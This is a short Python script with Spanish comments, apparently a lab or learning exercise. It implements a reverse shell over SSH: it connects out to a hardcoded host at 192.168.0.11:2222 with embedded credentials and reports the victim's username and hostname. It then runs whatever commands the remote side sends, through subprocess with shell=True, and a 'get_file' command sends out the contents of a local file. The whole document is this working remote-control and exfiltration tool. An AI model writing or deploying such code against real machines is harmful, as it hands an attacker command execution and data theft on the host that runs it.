import paramiko
import subprocess
import sys
import os
import shlex
import socket
import getpass


def ssh_comm():
    #ip del server
    ip = "192.168.0.11"
    port = 2222
    username = "sshuser"
    password = "sshpass"
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #ssh.connect(ip, port=port, username=username, password=password, disabled_algorithms={'pubkeys': ['rsa-sha2-256', 'rsa-sha2-512']})
    ssh.connect(ip, port=port, username=username, password=password)
    #abrimos una session ya que es el tipo de conexion que hemos especificado
    open_ssh_session = ssh.get_transport().open_session()
    #esto para saber hostname y usuario, simplemente mas info
    h_name = socket.gethostname()
    cur_user = getpass.getuser()
    #si esta enchufado
    if open_ssh_session.active:
        open_ssh_session.send(f"El usuario es {cur_user} y el host {h_name}\n")
        print(open_ssh_session.recv(1024).decode())
        #todo el tráfico que reciba vendrá a través del bucle este
        while True:
            command = open_ssh_session.recv(1024)
            try:
                ssh_command = command.decode()
                if ssh_command == "exit":
                    sys.exit()
                #para cambiar directorios y ejecutar comandos de mas de 1 palabra
                if ssh_command.split(" ")[0] == "cd":
                    path = ssh_command.split(" ")[1]
                    os.chdir(path)
                    curdir = os.getcwd()
                    ssh_command_output = subprocess.check_output(shlex.split(ssh_command), stderr=subprocess.STDOUT, shell=True)
                    open_ssh_session.send(f"{curdir}")
                #para cualquier otro comando
                if ssh_command == "get_file":
                    filetosend = open("texto.txt", "rb")
                    data = filetosend.read(8192)
                    open_ssh_session.send(data)
                    filetosend.close()
                else:
                    ssh_command_output = subprocess.check_output(shlex.split(ssh_command), stderr=subprocess.STDOUT, shell=True)
                    open_ssh_session.send(ssh_command_output)
            except Exception as e:
                open_ssh_session.send("Comando invalido")
            except KeyboardInterrupt:
                except_command = "Sesion interrumpida"
                open_ssh_session.send(except_command)
                quit()
    return


if __name__ == "__main__":
    ssh_comm()
